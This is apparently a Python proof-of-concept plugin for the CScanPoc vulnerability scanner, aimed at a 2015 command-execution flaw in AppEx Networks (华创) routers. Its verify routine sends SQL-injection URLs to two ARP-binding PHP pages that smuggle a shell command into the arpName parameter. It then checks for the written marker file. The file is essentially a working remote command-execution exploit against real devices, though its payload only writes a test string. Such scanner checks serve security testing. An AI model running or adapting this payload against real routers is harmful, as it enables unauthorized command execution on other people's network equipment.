# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import urllib.parse


class Vuln(ABVuln):
    vuln_id = 'AppExNetworks_0002'  # 平台漏洞编号，留空
    name = '华创路由器 命令执行'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.RCE  # 漏洞类型
    disclosure_date = '2015-08-19'  # 漏洞公布时间
    desc = '''
        华创智能加速路由器，设计缺陷。
        函数未做完整过滤，导致可上传任意文件，进而执行任意命令。
    '''  # 漏洞描述
    ref = 'Unknown'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = '华创路由器'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '3a2fed80-f152-4246-97d1-f45f14ad53bd'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-10'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }
                    
    def verify(self):
        self.target = self.target.rstrip('/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            # refer: http://www.wooyun.org/bugs/wooyun-2015-0135123
            hh = hackhttp.hackhttp()
            payloads = [
                self.target + '/acc/bindipmac/static_arp_bind.php?arpName=1%27%20and%200%20union%20select%201,%27woo||echo%20"testvul0">test.txt||yun%27,3,4,5,6,7,8--',
                self.target + '/acc/bindipmac/static_arp_del.php?x=1&arpName=1%27%20and%200%20union%20select%201,%27woo||echo%20"testvul1">test.txt||yun%27,3,4,5,6,7,8--'
            ]
            for i in range(len(payloads)):
                payload = payloads[i]
                code, head, res, err, _ = hh.http(payload)
                if code == 200:
                    # verify
                    code, head, res, err, _ = hh.http(
                        self.target + '/acc/bindipmac/test.txt')
                    if code == 200 and ("testvul"+str(i)) in res:
                        #security_hole("命令执行: "+payload)
                        self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                            target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
